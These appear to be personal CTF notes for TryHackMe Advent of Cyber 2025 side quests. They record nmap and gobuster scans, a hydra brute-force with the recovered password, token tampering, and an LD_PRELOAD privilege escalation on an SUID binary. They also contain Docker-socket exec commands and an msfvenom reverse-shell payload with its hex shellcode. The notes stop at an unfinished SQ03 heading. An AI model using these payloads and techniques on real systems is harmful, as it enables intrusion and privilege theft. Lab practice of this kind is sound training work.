---
topic: Side Quests
date: 2025-12-07T19:03:00
course: Advent of Cyber 2025
tags:
links:
  - "[[AdventOfCyber2025]]"
---
# SQ1 - The Great Disappearing Act

```unlock
https://tryhackme.com/room/sq1-aoc2025-FzPnrt2SAu
Key : now_you_see_me
```

**Unlock Hopper's Memories** - http://10.80.144.20:21337/

```shell
$ gobuster dir -u http://10.80.144.20/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt 

cgi-bin

```

"http://10.80.144.20:21337/unlock" - Method Not Allowed

```shell

 ➥ $ gobuster dir -u http://10.80.144.20:8000/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.80.144.20:8000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
media                (Status: 301) [Size: 0] [--> /media/]
admin                (Status: 301) [Size: 0] [--> /admin/]
chat                 (Status: 301) [Size: 0] [--> /chat/]
posts                (Status: 301) [Size: 0] [--> /posts/]
profiles             (Status: 301) [Size: 0] [--> /profiles/]
Progress: 87662 / 87662 (100.00%)
===============================================================
Finished
===============================================================


 ➥ $ gobuster dir -u http://10.80.144.20:8000/admin/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.80.144.20:8000/admin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
login                (Status: 301) [Size: 0] [--> /admin/login/]
chat                 (Status: 301) [Size: 0] [--> /admin/chat/]
posts                (Status: 301) [Size: 0] [--> /admin/posts/]
profiles             (Status: 301) [Size: 0] [--> /admin/profiles/]
logout               (Status: 301) [Size: 0] [--> /admin/logout/]
auth                 (Status: 301) [Size: 0] [--> /admin/auth/]
analytics            (Status: 301) [Size: 0] [--> /admin/analytics/]
configuration        (Status: 301) [Size: 0] [--> /admin/configuration/]
advertisements       (Status: 301) [Size: 0] [--> /admin/advertisements/]
Progress: 87662 / 87662 (100.00%)
===============================================================
Finished
===============================================================

```


guard.hopkins@hopsecasylum.com
Happy 43rd anniversary to the year I was born. Yep 1982! What a year for the world.

Trying my hand at some bruteforcing challenges on thm, good to see they have /opt/hashcat-utils/src/combinator.bin on the AttackBox! Always comes in handy.

Did you know that if you enter your password as a comment on a post, it appears as `*'s?`

http://10.80.160.168:8080/cgi-bin/key_flag.sh?door=hopper - 

guard.hopkins@hopsecasylum.com
"THM{h0pp1ing_m4d}"
Johnnyboy
@DoorDasher
Pizza1234$
brag

```nmap
PORT      STATE SERVICE         VERSION
22/tcp    open  ssh             OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 da:be:9f:05:93:d0:a2:36:6f:b3:87:47:ab:e5:13:a1 (ECDSA)
|_  256 93:a0:4f:0d:d9:8c:ca:60:96:66:96:c4:7e:5d:98:43 (ED25519)

80/tcp    open  http            nginx 1.24.0 (Ubuntu)
|_http-title: HopSec Asylum - Security Console
|_http-server-header: nginx/1.24.0 (Ubuntu)

8000/tcp  open  http-alt
| http-title: Fakebook - Sign In
|_Requested resource was /accounts/login/?next=/posts/

8080/tcp  open  http            SimpleHTTPServer 0.6 (Python 3.12.3)
|_http-server-header: SimpleHTTP/0.6 Python/3.12.3
|_http-title: HopSec Asylum - Security Console

9001/tcp  open  tor-orport?
| fingerprint-strings: 
|   NULL: 
|     ASYLUM GATE CONTROL SYSTEM - SCADA TERMINAL v2.1 
|     [AUTHORIZED PERSONNEL ONLY] 
|     WARNING: This system controls critical infrastructure
|     access attempts are logged and monitored
|     Unauthorized access will result in immediate termination
|     Authentication required to access SCADA terminal
|     Provide authorization token from Part 1 to proceed
|_    [AUTH] Enter authorization token:

13400/tcp open  hadoop-datanode Apache Hadoop 1.24.0 (Ubuntu)
|_http-title: HopSec Asylum \xE2\x80\x93 Facility Video Portal
| hadoop-tasktracker-info: 
|_  Logs: loginBtn
| hadoop-datanode-info: 
|_  Logs: loginBtn

13401/tcp open  http            Werkzeug httpd 3.1.3 (Python 3.12.3)
|_http-server-header: Werkzeug/3.1.3 Python/3.12.3
|_http-title: 404 Not Found

13402/tcp open  http            nginx 1.24.0 (Ubuntu)
|_http-title: Welcome to nginx!
|_http-cors: HEAD GET OPTIONS
|_http-server-header: nginx/1.24.0 (Ubuntu)

13403/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, RPCCheck, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, T

13404/tcp open  unknown
| fingerprint-strings: 
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    unauthorized

21337/tcp open  http            Werkzeug httpd 3.0.1 (Python 3.12.3)
|_http-title: Unlock Hopper's Memories
|_http-server-header: Werkzeug/3.0.1 Python/3.12.3

```

```shell

 ➥ $ gobuster dir -u http://10.82.148.87:8000/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -x php,js,txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.82.148.87:8000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,js,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
admin                (Status: 301) [Size: 0] [--> /admin/]
chat                 (Status: 301) [Size: 0] [--> /chat/]
media                (Status: 301) [Size: 0] [--> /media/]
posts                (Status: 301) [Size: 0] [--> /posts/]
profiles             (Status: 301) [Size: 0] [--> /profiles/]
Progress: 81924 / 81924 (100.00%)
===============================================================
Finished
===============================================================

```

```js
// Just run this in console
document.getElementById("loginWindow").style.display = "none";
document.getElementById("mapScreen").style.display = "block";

// Now you can access everything!
```

```

"HOPSEC", "ASYLUM", "ACCESS", "TERMINAL", "POST", "FACILITY", "AUTHORIZED", "PERSONNEL", "ONLY", "STORAGE", "STORAGE", "JSON", "STORAGE", "JSON", "HTML"
, "EMERGENCY", "CONTROL", "SCADA", "HTML", "HTML", "HTML", "POST", "URIC", "SCADA", "URIC", "DOMC"

```

```
markUnlocked("psych");

```

```
fetch("/cgi-bin/psych_check.sh?code=m4d") .then(r => r.json()) .then(d => console.log("GET response:", d));
http://10.80.173.77:13400/```

```
 
 ```
 ➥ $ hydra -l guard.hopkins@hopsecasylum.com -P ~/Downloads/this.txt 10.80.142.19 -s 8080 http-post-form "/cgi-bin/login.sh:username=^USER^&password=^PASS^:F=Invalid"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-02 16:08:50
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 648 login tries (l:1/p:648), ~41 tries per task
[DATA] attacking http-post-form://10.80.142.19:8080/cgi-bin/login.sh:username=^USER^&password=^PASS^:F=Invalid
[8080][http-post-form] host: 10.80.142.19   login: guard.hopkins@hopsecasylum.com   password: Johnnyboy1982!
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-02 16:09:14
[ blackArch 🛠️  ~/Downloads ]

```

```
doors  

Array(21) [ "hopper", "psych", "exit", "cell", "storage", "asylum", "ward", "emergency", "control", "main", … ]

0: "hopper"
1: "psych"
2: "exit"
3: "cell"
4: "storage"
5: "asylum"
6: "ward"
7: "emergency"
8: "control"
9: "main"
10: "front"
11: "back"
12: "side"
13: "1"
14: "2"
15: "3"
16: "A"
17: "B"
18: "C"
19: "psychward"
20: "exitdoor"

```

```js
async function testCode(code) {
    try {
        const response = await fetch('/cgi-bin/psych_check.sh', {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: 'code=' + encodeURIComponent(code)
        });
        const data = await response.json();
        console.log(`Response for code "${code}":`, data);
        return data;
    } catch (error) {
        console.log(`Error for code "${code}":`, error.message);
        return null;
    }
}

// Test a specific code, for example "42"
testCode("@43brag");
```

Response for code "115879": Object { ok: true, flag: "THM{Y0u_h4ve_b3en_" }

Bearer {"sub": "guard.hopkins@hopsecasylum.com", "role": "guard", "iat": 1764915535}.f19b3f00ac22de8046cd53d7b18b68670379793e29fe098651660cc891d5528b

```cameras
{"rtsp_url": "rtsp://vendor-cam.test/cam-lobby"}
{"rtsp_url": "rtsp://vendor-cam.test/cam-loading"}
{"rtsp_url": "rtsp://vendor-cam.test/cam-parking"}
{"rtsp_url": "rtsp://vendor-cam.test/cam-admin"}
```


```html

POST /v1/ingest/diagnostics HTTP/1.1
Host: 10.80.186.179:13401
Content-Type: application/json
Authorization: Bearer {"sub": "guard.hopkins@hopsecasylum.com", "role": "admin", "iat": 1765011939}.f23120e3f69e4845948105e1bc3f93822400274f1ca72bfa7fb400282b11e791
Pragma: no-cache
Cache-Control: no-cache

{"rtsp_url": "rtsp://vendor-cam.test/cam-admin"}
```

```html
GET /v1/ingest/jobs/a0fb7275-f40f-4d59-89ce-ad72975552d6 HTTP/1.1
Host: 10.80.186.179:13401
Content-Type: application/json
Authorization: Bearer {"sub": "guard.hopkins@hopsecasylum.com", "role": "admin", "iat": 1765011939}.f23120e3f69e4845948105e1bc3f93822400274f1ca72bfa7fb400282b11e791
Pragma: no-cache
Cache-Control: no-cache

{"rtsp_url": "rtsp://vendor-cam.test/cam-admin"}
```

cam-admin - 
{"job_id":"b76df34a-95d4-47d0-b37e-80e2dc6c6818","job_status":"/v1/ingest/jobs/b76df34a-95d4-47d0-b37e-80e2dc6c6818"}

{"console_port":13404,"rtsp_url":"rtsp://vendor-cam.test/cam-admin","status":"ready","token":"75f617134a5e4c12b6087d9d5c3111ab"}

cam-parking - 
{"job_id":"0dcfd4d8-c9da-46c1-8a50-76446c5b774e","job_status":"/v1/ingest/jobs/0dcfd4d8-c9da-46c1-8a50-76446c5b774e"}

{"console_port":13404,"rtsp_url":"rtsp://vendor-cam.test/cam-parking","status":"ready","token":"8d74449415714a3d91af61f0b59e59be"}

cam-loading - 
{"job_id":"141d4d48-2896-4471-ac89-1d2b4c0a3b8b","job_status":"/v1/ingest/jobs/141d4d48-2896-4471-ac89-1d2b4c0a3b8b"}

{"console_port":13404,"rtsp_url":"rtsp://vendor-cam.test/cam-loading","status":"ready","token":"cd1ec3f874c94ff3bc2574566cf42082"}

cam-lobby - 
{"job_id":"5fce1b4e-9e9c-4217-8ca6-379cea5565ea","job_status":"/v1/ingest/jobs/5fce1b4e-9e9c-4217-8ca6-379cea5565ea"}

{"console_port":13404,"rtsp_url":"rtsp://vendor-cam.test/cam-lobby","status":"ready","token":"f881dce562f7445ab67392be9cca3dd4"}


```
j3stered_739138}
```

full - 

```
THM{Y0u_h4ve_b3en_j3stered_739138}
```

dockermgr@tryhackme-2404:~$ ls -la /usr/local/bin/diag_shell
ls -la /usr/local/bin/diag_shell
-rwsr-xr-x 1 dockermgr dockermgr 16056 Nov 27 16:31 /usr/local/bin/diag_shell
dockermgr@tryhackme-2404:~$ 

```SUID
dockermgr@tryhackme-2404:~$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/snap/core20/2682/usr/bin/chfn
/snap/core20/2682/usr/bin/chsh
/snap/core20/2682/usr/bin/gpasswd
/snap/core20/2682/usr/bin/mount
/snap/core20/2682/usr/bin/newgrp
/snap/core20/2682/usr/bin/passwd
/snap/core20/2682/usr/bin/su
/snap/core20/2682/usr/bin/sudo
/snap/core20/2682/usr/bin/umount
/snap/core20/2682/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2682/usr/lib/openssh/ssh-keysign
/snap/core20/2669/usr/bin/chfn
/snap/core20/2669/usr/bin/chsh
/snap/core20/2669/usr/bin/gpasswd
/snap/core20/2669/usr/bin/mount
/snap/core20/2669/usr/bin/newgrp
/snap/core20/2669/usr/bin/passwd
/snap/core20/2669/usr/bin/su
/snap/core20/2669/usr/bin/sudo
/snap/core20/2669/usr/bin/umount
/snap/core20/2669/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2669/usr/lib/openssh/ssh-keysign
/snap/core24/1225/usr/bin/chfn
/snap/core24/1225/usr/bin/chsh
/snap/core24/1225/usr/bin/gpasswd
/snap/core24/1225/usr/bin/mount
/snap/core24/1225/usr/bin/newgrp
/snap/core24/1225/usr/bin/passwd
/snap/core24/1225/usr/bin/su
/snap/core24/1225/usr/bin/sudo
/snap/core24/1225/usr/bin/umount
/snap/core24/1225/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core24/1225/usr/lib/openssh/ssh-keysign
/snap/core24/1225/usr/lib/polkit-1/polkit-agent-helper-1
/snap/core/17247/bin/mount
/snap/core/17247/bin/ping
/snap/core/17247/bin/ping6
/snap/core/17247/bin/su
/snap/core/17247/bin/umount
/snap/core/17247/usr/bin/chfn
/snap/core/17247/usr/bin/chsh
/snap/core/17247/usr/bin/gpasswd
/snap/core/17247/usr/bin/newgrp
/snap/core/17247/usr/bin/passwd
/snap/core/17247/usr/bin/sudo
/snap/core/17247/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/17247/usr/lib/openssh/ssh-keysign
/snap/core/17247/usr/lib/snapd/snap-confine
/snap/core/17247/usr/sbin/pppd
/snap/core18/2959/bin/mount
/snap/core18/2959/bin/ping
/snap/core18/2959/bin/su
/snap/core18/2959/bin/umount
/snap/core18/2959/usr/bin/chfn
/snap/core18/2959/usr/bin/chsh
/snap/core18/2959/usr/bin/gpasswd
/snap/core18/2959/usr/bin/newgrp
/snap/core18/2959/usr/bin/passwd
/snap/core18/2959/usr/bin/sudo
/snap/core18/2959/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2959/usr/lib/openssh/ssh-keysign
/snap/core18/2976/bin/mount
/snap/core18/2976/bin/ping
/snap/core18/2976/bin/su
/snap/core18/2976/bin/umount
/snap/core18/2976/usr/bin/chfn
/snap/core18/2976/usr/bin/chsh
/snap/core18/2976/usr/bin/gpasswd
/snap/core18/2976/usr/bin/newgrp
/snap/core18/2976/usr/bin/passwd
/snap/core18/2976/usr/bin/sudo
/snap/core18/2976/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2976/usr/lib/openssh/ssh-keysign
/snap/core22/2139/usr/bin/chfn
/snap/core22/2139/usr/bin/chsh
/snap/core22/2139/usr/bin/gpasswd
/snap/core22/2139/usr/bin/mount
/snap/core22/2139/usr/bin/newgrp
/snap/core22/2139/usr/bin/passwd
/snap/core22/2139/usr/bin/su
/snap/core22/2139/usr/bin/sudo
/snap/core22/2139/usr/bin/umount
/snap/core22/2139/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core22/2139/usr/lib/openssh/ssh-keysign
/snap/core22/2139/usr/libexec/polkit-agent-helper-1
/snap/core22/2163/usr/bin/chfn
/snap/core22/2163/usr/bin/chsh
/snap/core22/2163/usr/bin/gpasswd
/snap/core22/2163/usr/bin/mount
/snap/core22/2163/usr/bin/newgrp
/snap/core22/2163/usr/bin/passwd
/snap/core22/2163/usr/bin/su
/snap/core22/2163/usr/bin/sudo
/snap/core22/2163/usr/bin/umount
/snap/core22/2163/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core22/2163/usr/lib/openssh/ssh-keysign
/snap/core22/2163/usr/libexec/polkit-agent-helper-1

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine

/usr/bin/chfn
/usr/bin/sudo
/usr/bin/umount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/su
/usr/bin/mount
/usr/local/bin/diag_shell
dockermgr@tryhackme-2404:~$ 
```


https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version
Sudo version 1.9.15p5

-rw-r--r-- 1 root root 181 Dec  5 11:47 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 101 Dec  5 11:47 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 573 Dec  5 11:47 /etc/ssh/ssh_host_rsa_key.pub

PasswordAuthentication no
UsePAM yes

API_SECRET=d3vs3cr3t_2932932

svc_vidops@tryhackme-2404:~$ pwd
pwd
/opt/hopsec-asylumn/hopsec-asylumn

```
### **Step-by-Step:**

1. **First, background your shell:** 
	Press `Ctrl+Z`
2. **On YOUR machine:**
	stty raw -echo; fg
3. **In the shell:** 
	reset
	export TERM=xterm-256color
	export SHELL=/bin/bash
	stty rows 50 columns 132
```

```
# Try these in order:
python3 -c 'import pty; pty.spawn("/bin/bash")'

# If that works, then:
export TERM=xterm
export SHELL=/bin/bash
stty rows 50 columns 132

# Clear screen
reset
```

```
echo 'int getuid() { return 0; } int geteuid() { return 0; }' > /tmp/root.c && \ gcc -fPIC -shared -o /tmp/root.so /tmp/root.c && \ LD_PRELOAD=/tmp/root.so /usr/local/bin/diag_shell 'cat /root/.asylum/unlock_code 2>&1'
```

```
XEC_ID=$(curl -s --unix-socket /var/run/docker.sock -X POST -H "Content-Type: application/json" -d '{"AttachStdout":true,"Cmd":["cat","/opt/scada/scada_terminal.py"]}' http://localhost/containers/1cbf40c715f4/exec | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)-o '"Id":"[^"]*"' | cut -d'"' -f4)
root@tryhackme-2404:~# echo "Python script:"
Python script:
root@tryhackme-2404:~# curl -s --unix-socket /var/run/docker.sock -X POST -H "Content-Type: application/json" -d '{"Detach":false}' "http://localhost/exec/$EXEC_ID/start" --output - | tail -c +9 | head -50

```

```
THM{p0p_go3s_THe_W3as3l}`
```

https://static-labs.tryhackme.cloud/apps/hoppers-invitation/

```
THM{There.is.no.EASTmas.without.Hopper}
```

hopper-origins.txt

hlRAqw3zFxnrgUw1GZusk+whhQHE0F+g7YjWjoJvpZRSCoDzehjXsEX1wQ6TTlOPyEJ/k+AEiMOxdqywh/86AOmhTaXNyZAvbHUVjfMdTqdzxmLXZJwI5ynI

salt | iv | tag | ciphertext

Bytes 0–15   : s (16 bytes)  = Salt
Bytes 16–27  : i (12 bytes)  = IV
Bytes 28–43  : t (16 bytes)  = Authentication Tag (e.g., AES-GCM tag)
Bytes 44–end : c (remaining) = Ciphertext

```

```python
#!/usr/bin/env python3
import base64
import hashlib
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# Inputs
password = "THM{There.is.no.EASTmas.without.Hopper}"
raw_b64 = "hlRAqw3zFxnrgUw1GZusk+whhQHE0F+g7YjWjoJvpZRSCoDzehjXsEX1wQ6TTlOPyEJ/k+AEiMOxdqywh/86AOmhTaXNyZAvbHUVjfMdTqdzxmLXZJwI5ynI"

# Decode base64
raw = base64.b64decode(raw_b64)

# Extract parts
salt = raw[0:16]          # 16 bytes
iv = raw[16:28]           # 12 bytes
tag = raw[28:44]          # 16 bytes
ciphertext = raw[44:]     # rest (46 bytes)

print("=== EXTRACTED DATA ===")
print(f"Salt (hex): {salt.hex()}")
print(f"IV (hex): {iv.hex()}")
print(f"Tag (hex): {tag.hex()}")
print(f"Ciphertext length: {len(ciphertext)} bytes")
print(f"Total raw length: {len(raw)} bytes")
print()

print(f"=== USING PASSWORD ===")
print(f"Password: '{password}'")
print(f"Password length: {len(password)} characters")
print()

# Derive key using PBKDF2 with 100,000 iterations
print("=== KEY DERIVATION ===")
print("Using PBKDF2-HMAC-SHA256 with 100,000 iterations...")
key = hashlib.pbkdf2_hmac(
    'sha256',
    password.encode('utf-8'),
    salt,
    100000,
    dklen=32
)
print(f"Derived key (hex): {key.hex()}")
print(f"Key length: {len(key)} bytes ({len(key)*8} bits)")
print()

# Decrypt
print("=== DECRYPTION ===")
aesgcm = AESGCM(key)
plaintext = aesgcm.decrypt(iv, ciphertext + tag, None)

print(f"Decrypted length: {len(plaintext)} bytes")
print()

print("=== DECRYPTED CONTENT ===")
try:
    # Try to decode as UTF-8 text
    decoded_text = plaintext.decode('utf-8')
    print("✓ Decoded as UTF-8 text:")
    print("-" * 50)
    print(decoded_text)
    print("-" * 50)
    
    # Also show hex for verification
    print(f"\nHex dump:")
    print(plaintext.hex())
    
except UnicodeDecodeError:
    # If not UTF-8, show hex
    print("✗ Not valid UTF-8 text. Hex dump:")
    print(plaintext.hex())
    print(f"\nFirst 50 bytes as ASCII (dots for non-printable):")
    ascii_repr = ''.join(chr(b) if 32 <= b < 127 else '.' for b in plaintext[:50])
    print(ascii_repr)

print()
print("=" * 50)
print("SUMMARY:")
print(f"- Password: {password}")
print(f"- KDF: PBKDF2-HMAC-SHA256 with 100,000 iterations")
print(f"- Key: {key.hex()[:16]}...")
print(f"- Decrypted {len(plaintext)} bytes successfully")
```

```
https://tryhackme.com/room/ho-aoc2025-yboMoPbnEX
```

# SQ0 - Hoppers Origins

https://tryhackme.com/room/ho-aoc2025-yboMoPbnEX

```
On Linux machines, you can find flags here:

- **user.txt** - In `/user.txt`
- **root.txt** - In `/root/root.txt`

On Windows machines, you can find flags here:

- **user.txt** - In `C:\user.txt`
- **root.txt** - In `C:\Users\Administrator\root.txt`
```

# SQ02 - Scheme Catcher

https://tryhackme.com/room/sq2-aoc2025-JxiOKUSD9R

![Unlock Key](Assets/Images/sq02_2025.png)
```
tit_for_tat
```


**Nmap Scan Result** : - 
```shell
 ➥ $ nmap -sCV -p- 10.80.155.225
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-11 03:28 +0000
Nmap scan report for 10.80.155.225
Host is up (0.013s latency).
Not shown: 65531 closed tcp ports (conn-refused)

PORT      STATE SERVICE VERSION

22/tcp    open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c5:66:28:39:de:02:df:ca:2a:d7:2d:91:7b:7f:bb:25 (ECDSA)
|_  256 d2:74:2f:75:f2:12:ea:dc:c8:3e:51:9e:73:4f:b6:bb (ED25519)

80/tcp    open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Under Construction

9004/tcp  open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, RPCCheck, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     Payload Storage Malhare's
|     Version 4.2.0
|     >>Invalid option
|   GenericLines, NULL: 
|     Payload Storage Malhare's
|_    Version 4.2.0

21337/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.12.3)
|_http-server-header: Werkzeug/3.0.1 Python/3.12.3
|_http-title: Unlock Hopper's Memories

```

```extra
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9004-TCP:V=7.98%I=7%D=12/11%Time=693A3B22%P=x86_64-pc-linux-gnu%r(N
SF:ULL,46,"Payload\x20Storage\x20Malhare's\nVersion\x204\.2\.0\n\[1\]\x20C
SF::\n\[2\]\x20U:\n\[3\]\x20D:\n\[4\]\x20E:\n>>")%r(JavaRMI,55,"Payload\x2
SF:0Storage\x20Malhare's\nVersion\x204\.2\.0\n\[1\]\x20C:\n\[2\]\x20U:\n\[
SF:3\]\x20D:\n\[4\]\x20E:\n>>Invalid\x20option\n")%r(GenericLines,46,"Payl
SF:oad\x20Storage\x20Malhare's\nVersion\x204\.2\.0\n\[1\]\x20C:\n\[2\]\x20
SF:U:\n\[3\]\x20D:\n\[4\]\x20E:\n>>")%r(GetRequest,55,"Payload\x20Storage\
SF:x20Malhare's\nVersion\x204\.2\.0\n\[1\]\x20C:\n\[2\]\x20U:\n\[3\]\x20D:
SF:\n\[4\]\x20E:\n>>Invalid\x20option\n")%r(HTTPOptions,55,"Payload\x20Sto
SF:rage\x20Malhare's\nVersion\x204\.2\.0\n\[1\]\x20C:\n\[2\]\x20U:\n\[3\]\
SF:x20D:\n\[4\]\x20E:\n>>Invalid\x20option\n")%r(RTSPRequest,55,"Payload\x
SF:20Storage\x20Malhare's\nVersion\x204\.2\.0\n\[1\]\x20C:\n\[2\]\x20U:\n\
SF:[3\]\x20D:\n\[4\]\x20E:\n>>Invalid\x20option\n")%r(RPCCheck,55,"Payload
SF:\x20Storage\x20Malhare's\nVersion\x204\.2\.0\n\[1\]\x20C:\n\[2\]\x20U:\
SF:n\[3\]\x20D:\n\[4\]\x20E:\n>>Invalid\x20option\n")%r(DNSVersionBindReqT
SF:CP,55,"Payload\x20Storage\x20Malhare's\nVersion\x204\.2\.0\n\[1\]\x20C:
SF:\n\[2\]\x20U:\n\[3\]\x20D:\n\[4\]\x20E:\n>>Invalid\x20option\n")%r(DNSS
SF:tatusRequestTCP,55,"Payload\x20Storage\x20Malhare's\nVersion\x204\.2\.0
SF:\n\[1\]\x20C:\n\[2\]\x20U:\n\[3\]\x20D:\n\[4\]\x20E:\n>>Invalid\x20opti
SF:on\n")%r(Help,55,"Payload\x20Storage\x20Malhare's\nVersion\x204\.2\.0\n
SF:\[1\]\x20C:\n\[2\]\x20U:\n\[3\]\x20D:\n\[4\]\x20E:\n>>Invalid\x20option
SF:\n")%r(SSLSessionReq,55,"Payload\x20Storage\x20Malhare's\nVersion\x204\
SF:.2\.0\n\[1\]\x20C:\n\[2\]\x20U:\n\[3\]\x20D:\n\[4\]\x20E:\n>>Invalid\x2
SF:0option\n")%r(TerminalServerCookie,55,"Payload\x20Storage\x20Malhare's\
SF:nVersion\x204\.2\.0\n\[1\]\x20C:\n\[2\]\x20U:\n\[3\]\x20D:\n\[4\]\x20E:
SF:\n>>Invalid\x20option\n")%r(TLSSessionReq,55,"Payload\x20Storage\x20Mal
SF:hare's\nVersion\x204\.2\.0\n\[1\]\x20C:\n\[2\]\x20U:\n\[3\]\x20D:\n\[4\
SF:]\x20E:\n>>Invalid\x20option\n")%r(Kerberos,55,"Payload\x20Storage\x20M
SF:alhare's\nVersion\x204\.2\.0\n\[1\]\x20C:\n\[2\]\x20U:\n\[3\]\x20D:\n\[
SF:4\]\x20E:\n>>Invalid\x20option\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```
 ➥ $ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.135.52 LPORT=4444 -f hex
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of hex file: 148 bytes
6a2958996a025f6a015e0f05489748b90200115cc0a88734514889e66a105a6a2a580f056a035e48ffce6a21580f0575f66a3b589948bb2f62696e2f736800534889e752574889e60f05

```

```shell
 ➥ $ gobuster dir -u http://10.80.159.26/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,js,txt,jpg,jpeg,xml
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.80.159.26/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,js,txt,jpg,jpeg,xml
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
dev                  (Status: 301) [Size: 310] [--> http://10.80.159.26/dev/]
server-status        (Status: 403) [Size: 277]
Progress: 435967 / 435967 (100.00%)
===============================================================
Finished
===============================================================

```

We got an zip file here - "http://10.80.159.26/dev/". after extracting the zip and analyzing using ghidra found a flag and key.

```
THM{Welcom3_to_th3_eastmass_pwnland}

Key : EastMass
```

```
http://10.80.172.73/7ln6Z1X9EF/foothold.txt

THM{byp4ss_and_pack_is_pwn_you_n33d}
```

```
Terminal 1 :

$ ./beacon.bin

Terminal 2:

$ sudo socat TCP-LISTEN:80,fork TCP:10.80.172.73:80

Termial 3:
$ echo "2" | nc localhost 4444
```

Captured the data in wireshark and found that interesting dir.

and another "4.2.0-R1-1337-server.zip" file.

```
 ➥ $ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

```


```
env LD_PRELOAD=./libc.so.6 ./ld-linux-x86-64.so.2 ./server

sudo gdb -p {Process_ID}
```

```
info proc mappings

heap bins tcache
```




0x55556e4333c0:
# SQ03 - Carrotbane of My Existence

